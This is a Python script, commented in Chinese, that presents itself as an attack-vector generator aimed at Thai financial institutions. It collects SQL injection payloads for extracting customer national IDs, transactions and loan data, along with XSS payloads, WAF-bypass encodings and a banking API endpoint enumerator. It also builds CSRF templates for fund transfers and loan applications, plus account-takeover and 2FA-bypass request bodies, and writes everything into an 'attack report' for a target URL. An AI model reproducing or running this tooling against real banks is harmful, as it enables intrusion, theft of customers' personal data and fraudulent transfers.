#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国金融行业特定攻击向量设计器 - 简化版
Thai Financial Industry Specific Attack Vectors Designer - Simplified Version

专门针对泰国金融系统设计的攻击向量集合
包含银行、贷款、保险、证券等金融领域的攻击技术
"""

import asyncio
import aiohttp
import json
import time
import random
import hashlib
import base64
import string
from datetime import datetime
from urllib.parse import quote, urlencode
from typing import Dict, List, Any, Optional, Tuple

class ThaiFinancialAttackVectorsSimple:
    """泰国金融行业攻击向量生成器 - 简化版"""

    def __init__(self):
        self.session = None
        self.attack_results = []

        # 泰国金融监管机构和技术栈
        self.thai_financial_context = {
            "regulatory_bodies": [
                "BOT (Bank of Thailand)",
                "SEC (Securities and Exchange Commission)",
                "OIC (Office of Insurance Commission)",
                "Ministry of Finance"
            ],
            "financial_systems": [
                "Core Banking Systems",
                "Loan Management Systems",
                "Digital Banking Platforms",
                "Mobile Banking Apps",
                "Payment Gateway Systems",
                "ATM Networks",
                "Credit Card Processing"
            ],
            "common_technology_stack": [
                "Java EE / Spring Framework",
                "Microsoft .NET Framework",
                "IBM Mainframe Systems",
                "Oracle Database",
                "Microsoft SQL Server",
                "MongoDB",
                "WebSphere / WebLogic",
                "Apache Tomcat",
                "IIS Server"
            ]
        }

        # 泰语金融术语和载荷
        self.thai_financial_payloads = {
            "sql_injection": {
                "customer_data": [
                    "' OR 1=1 AND customer_type='personal'--",
                    "' UNION SELECT customer_id,thai_name,english_name,national_id FROM customers--",
                    "loan' OR 1=1 AND loan_status='approved'--",
                    "' AND account_number LIKE '%000%' AND 1=1--",
                    "deposit' OR 1=1 AND account_type='savings'--"
                ],
                "transaction_data": [
                    "' OR 1=1 AND transaction_type='transfer'--",
                    "' UNION SELECT transaction_id,amount,from_account,to_account FROM transactions--",
                    "' AND amount > 100000 AND 1=1--",
                    "transaction' OR transaction_status='success' AND 1=1--"
                ],
                "loan_data": [
                    "' OR 1=1 AND loan_type='home_loan'--",
                    "' UNION SELECT loan_id,credit_limit,interest_rate,loan_term FROM loans--",
                    "collateral' OR 1=1 AND collateral_type='house'--",
                    "' AND interest_rate < 5.0 AND 1=1--"
                ]
            },
            "xss_payloads": {
                "banking_context": [
                    "<script>alert('Bank System Hacked')</script>",
                    "<img src=x onerror=alert('Customer Data Leak')>",
                    "';alert('Bank Account');//",
                    "<svg onload=alert('Thai Bank')>",
                    "<iframe src=javascript:alert('Illegal Transfer')></iframe>"
                ],
                "loan_context": [
                    "<script>alert('Loan System Vulnerability')</script>",
                    "<img src=x onerror=alert('Borrower Data Leak')>",
                    "';alert('Loan Applicant');//",
                    "<svg onload=alert('Loan Approved')>",
                    "<body onload=alert('Car Loan')>"
                ]
            },
            "api_attacks": {
                "banking_apis": [
                    "/api/v1/customers", "/api/v1/accounts", "/api/v1/transactions",
                    "/api/v1/loans", "/api/v1/payments", "/api/v1/cards",
                    "/api/v1/branches", "/api/v1/rates", "/mobile/banking/api/login",
                    "/digital/api/balance"
                ],
                "loan_apis": [
                    "/api/loan/application", "/api/loan/status", "/api/loan/calculator",
                    "/api/loan/documents", "/api/loan/approval", "/api/customer/profile",
                    "/api/customer/credit-check", "/api/repayment/schedule",
                    "/api/collateral/valuation"
                ]
            }
        }

        # 泰国金融系统WAF绕过技术
        self.thai_waf_bypass = {
            "encoding_techniques": [
                "URL Encoding",
                "Unicode Encoding",
                "Double URL Encoding",
                "Base64 Encoding",
                "Hex Encoding"
            ],
            "comment_injection": [
                "/**/",
                "/* thai */",
                "-- thai_comment",
                "# bank",
                "/* finance */",
                "/* bypass */",
                "--comment"
            ],
            "case_variation": [
                "SeLeCt", "UNiOn", "FrOm", "WhErE", "InSeRt",
                "UpDaTe", "DeLeTe", "CrEaTe", "DrOp", "AlTeR"
            ],
            "whitespace_bypass": [
                "/**/", "%20", "+", "%09", "%0A", "%0D", "%0B",
                "\t", "\n", "\r", "\v", "%c0%80"
            ]
        }

    async def generate_thai_sql_payload(self, target_type: str, injection_point: str) -> List[str]:
        """生成泰语SQL注入载荷"""
        payloads = []

        if target_type == "banking":
            base_payloads = self.thai_financial_payloads["sql_injection"]["customer_data"]
        elif target_type == "loan":
            base_payloads = self.thai_financial_payloads["sql_injection"]["loan_data"]
        else:
            base_payloads = self.thai_financial_payloads["sql_injection"]["transaction_data"]

        for payload in base_payloads:
            # 应用WAF绕过技术
            encoded_variants = [
                payload,
                self._apply_url_encoding(payload),
                self._apply_comment_injection(payload),
                self._apply_case_variation(payload),
                self._apply_whitespace_bypass(payload)
            ]

            payloads.extend([v for v in encoded_variants if v])

        return payloads

    def _apply_url_encoding(self, payload: str) -> str:
        """URL编码绕过"""
        return quote(payload, safe='')

    def _apply_comment_injection(self, payload: str) -> str:
        """注释注入绕过"""
        comments = random.choice(self.thai_waf_bypass["comment_injection"])
        return payload.replace("'", f"'{comments}")

    def _apply_case_variation(self, payload: str) -> str:
        """大小写变化绕过"""
        sql_keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'DROP']
        for keyword in sql_keywords:
            if keyword.lower() in payload.lower():
                # 随机变化大小写
                new_keyword = ''.join([c.upper() if random.random() > 0.5 else c.lower()
                                     for c in keyword])
                payload = payload.replace(keyword, new_keyword, 1)
        return payload

    def _apply_whitespace_bypass(self, payload: str) -> str:
        """空白符绕过"""
        whitespace = random.choice(self.thai_waf_bypass["whitespace_bypass"])
        return payload.replace(' ', whitespace)

    async def generate_thai_xss_payload(self, context: str) -> List[str]:
        """生成泰语XSS载荷"""
        if context == "banking":
            base_payloads = self.thai_financial_payloads["xss_payloads"]["banking_context"]
        else:
            base_payloads = self.thai_financial_payloads["xss_payloads"]["loan_context"]

        xss_payloads = []
        for payload in base_payloads:
            # 编码变体
            encoded_variants = [
                payload,
                self._html_encode(payload),
                self._url_encode_xss(payload)
            ]
            xss_payloads.extend(encoded_variants)

        return xss_payloads

    def _html_encode(self, payload: str) -> str:
        """HTML编码"""
        html_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '/': '&#x2F;'
        }
        for char, entity in html_entities.items():
            payload = payload.replace(char, entity)
        return payload

    def _url_encode_xss(self, payload: str) -> str:
        """URL编码XSS"""
        return quote(payload, safe='')

    async def discover_thai_financial_endpoints(self, base_url: str) -> List[str]:
        """发现泰国金融系统API端点"""
        discovered_endpoints = []

        # 基础路径
        base_paths = [
            "/api/v1", "/api/v2", "/mobile/api", "/digital/api",
            "/banking/api", "/loan/api", "/payment/api", "/card/api"
        ]

        # 金融相关端点
        financial_endpoints = [
            "/customers", "/accounts", "/transactions", "/loans",
            "/payments", "/cards", "/branches", "/rates", "/balance",
            "/transfer", "/deposit", "/withdrawal", "/investment",
            "/insurance", "/credit", "/mortgage", "/savings"
        ]

        for base_path in base_paths:
            for endpoint in financial_endpoints:
                full_endpoint = f"{base_url}{base_path}{endpoint}"
                discovered_endpoints.append(full_endpoint)

        return discovered_endpoints

    async def generate_thai_csrf_attacks(self) -> Dict[str, Any]:
        """生成泰国金融系统CSRF攻击"""
        csrf_attacks = {
            "banking_operations": [
                {
                    "name": "Fund Transfer Attack",
                    "description": "Illegal fund transfer",
                    "method": "POST",
                    "parameters": {
                        "from_account": "1234567890",
                        "to_account": "0987654321",
                        "amount": "50000",
                        "currency": "THB",
                        "reference": "CSRF_ATTACK"
                    }
                },
                {
                    "name": "Bill Payment Attack",
                    "description": "Bill payment attack",
                    "method": "POST",
                    "parameters": {
                        "bill_id": "THAI_ELECTRIC_001",
                        "amount": "2500",
                        "payment_method": "SAVINGS_ACCOUNT"
                    }
                },
                {
                    "name": "Loan Application Attack",
                    "description": "Loan application attack",
                    "method": "POST",
                    "parameters": {
                        "loan_type": "PERSONAL_LOAN",
                        "amount": "500000",
                        "term_months": "24",
                        "purpose": "CSRF_TEST"
                    }
                }
            ],
            "bypass_techniques": [
                "Token Bypass via GET Parameter",
                "Origin Header Manipulation",
                "Referer Header Spoofing",
                "Cross-Origin Resource Sharing (CORS) Abuse",
                "JSONP Hijacking"
            ]
        }

        return csrf_attacks

    async def create_thai_business_logic_attacks(self) -> Dict[str, Any]:
        """创建泰国金融业务逻辑攻击"""
        business_logic_attacks = {
            "loan_approval_bypass": [
                {
                    "name": "Interest Rate Manipulation",
                    "description": "Interest rate manipulation attack",
                    "payload": {
                        "requested_rate": "0.1",  # 10% (abnormally low)
                        "customer_tier": "PREMIUM_VIP",
                        "special_promotion": "TRUE"
                    }
                },
                {
                    "name": "Credit Limit Increase",
                    "description": "Credit limit increase attack",
                    "payload": {
                        "requested_limit": "10000000",
                        "credit_score_override": "850",
                        "manual_approval_bypass": "TRUE"
                    }
                }
            ],
            "transaction_manipulation": [
                {
                    "name": "Double Spend Attack",
                    "description": "Double spend attack",
                    "payload": {
                        "transaction_id": "MANUAL_OVERRIDE",
                        "amount": "100000",
                        "duplicate_prevention": "DISABLE"
                    }
                },
                {
                    "name": "Transaction Limit Bypass",
                    "description": "Transaction limit bypass",
                    "payload": {
                        "amount": "5000000",
                        "daily_limit_override": "TRUE",
                        "special_transaction": "BANK_TRANSFER"
                    }
                }
            ],
            "account_takeover": [
                {
                    "name": "Password Reset Bypass",
                    "description": "Password reset bypass",
                    "payload": {
                        "email": "victim@bank.com",
                        "reset_token": "ADMIN_OVERRIDE",
                        "new_password": "Hacked123!"
                    }
                },
                {
                    "name": "2FA Bypass",
                    "description": "Two-factor authentication bypass",
                    "payload": {
                        "otp_code": "000000",
                        "bypass_method": "ADMIN_EMERGENCY",
                        "trust_device": "TRUE"
                    }
                }
            ]
        }

        return business_logic_attacks

    async def generate_comprehensive_attack_report(self, target_url: str) -> Dict[str, Any]:
        """生成综合攻击报告"""
        report = {
            "target_analysis": {
                "url": target_url,
                "target_type": "Thai Financial Institution",
                "analysis_date": datetime.now().isoformat(),
                "risk_level": "HIGH"
            },
            "attack_vectors": {
                "sql_injection": await self.generate_thai_sql_payload("banking", "id"),
                "xss_attacks": await self.generate_thai_xss_payload("banking"),
                "api_endpoints": await self.discover_thai_financial_endpoints(target_url),
                "csrf_attacks": await self.generate_thai_csrf_attacks(),
                "business_logic": await self.create_thai_business_logic_attacks()
            },
            "waf_bypass_techniques": self.thai_waf_bypass,
            "thai_context": self.thai_financial_context,
            "recommendations": [
                "Implement WAF with Thai language support",
                "Enable input validation for Thai characters",
                "Deploy comprehensive logging and monitoring",
                "Conduct regular penetration testing",
                "Implement security awareness training in Thai"
            ]
        }

        return report

# 测试和使用示例
async def test_thai_financial_attack_vectors():
    """测试泰国金融攻击向量生成器"""

    print("泰国金融行业特定攻击向量生成器")
    print("=" * 50)

    generator = ThaiFinancialAttackVectorsSimple()

    # 测试SQL注入载荷生成
    print("\n泰语SQL注入载荷:")
    sql_payloads = await generator.generate_thai_sql_payload("banking", "id")
    for i, payload in enumerate(sql_payloads[:5], 1):
        print(f"  {i}. {payload}")

    # 测试XSS载荷生成
    print("\n泰语XSS载荷:")
    xss_payloads = await generator.generate_thai_xss_payload("banking")
    for i, payload in enumerate(xss_payloads[:5], 1):
        print(f"  {i}. {payload}")

    # 测试API端点发现
    print("\n金融API端点发现:")
    endpoints = await generator.discover_thai_financial_endpoints("https://example-bank.com")
    for i, endpoint in enumerate(endpoints[:10], 1):
        print(f"  {i}. {endpoint}")

    # 测试CSRF攻击生成
    print("\nCSRF攻击策略:")
    csrf_attacks = await generator.generate_thai_csrf_attacks()
    for attack in csrf_attacks["banking_operations"][:3]:
        print(f"  * {attack['name']}: {attack['description']}")

    # 测试业务逻辑攻击
    print("\n业务逻辑攻击:")
    logic_attacks = await generator.create_thai_business_logic_attacks()
    for category, attacks in logic_attacks.items():
        print(f"  {category}: {len(attacks)} 种攻击")

    # 生成完整报告
    print("\n生成综合攻击报告...")
    report = await generator.generate_comprehensive_attack_report("https://example-thai-bank.com")

    print(f"报告生成完成!")
    print(f"   - SQL注入载荷: {len(report['attack_vectors']['sql_injection'])} 个")
    print(f"   - XSS载荷: {len(report['attack_vectors']['xss_attacks'])} 个")
    print(f"   - API端点: {len(report['attack_vectors']['api_endpoints'])} 个")
    print(f"   - 攻击向量总数: 5 类")

    # 保存报告
    report_file = f"thai_financial_attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, ensure_ascii=False, indent=2)

    print(f"报告已保存到: {report_file}")

if __name__ == "__main__":
    asyncio.run(test_thai_financial_attack_vectors())